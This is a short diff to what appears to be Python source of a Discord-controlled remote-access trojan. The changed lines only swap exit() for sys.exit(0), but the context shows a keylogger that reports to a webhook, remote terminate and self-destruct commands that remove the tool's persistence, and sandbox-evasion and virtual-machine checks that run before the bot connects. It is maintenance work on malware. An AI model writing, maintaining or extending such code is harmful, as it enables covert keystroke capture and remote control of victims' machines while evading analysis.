@@ -73,7 +73,7 @@ def keylogs():
         keyloggerr = keylogger.Keylogger(interval=1800, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
         keyloggerr.start()
     except KeyboardInterrupt:
-        exit()
+        sys.exit(0)
 
 def getIP():            
         try:
@@ -402,7 +402,7 @@ async def terminate(context):
         my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
         await context.message.channel.send(embed=my_embed)
         await client.close()        
-        exit()
+        sys.exit(0)
     else:
         pass
 
@@ -422,7 +422,7 @@ async def selfdestruct(context):
             my_embed = discord.Embed(title=f"Self-Destruction on Agent#{ID} Completed Succesfully", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
             await client.close()        
-            exit()
+            sys.exit(0)
 
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while removing Agent#{ID} persistence:\n{e}", color=0xFF0000)
@@ -489,4 +489,4 @@ if sandboxevasion.test() == True and isVM() == False:
 
     client.run(BOT_TOKEN)
 else:
-    exit()
+    sys.exit(0)
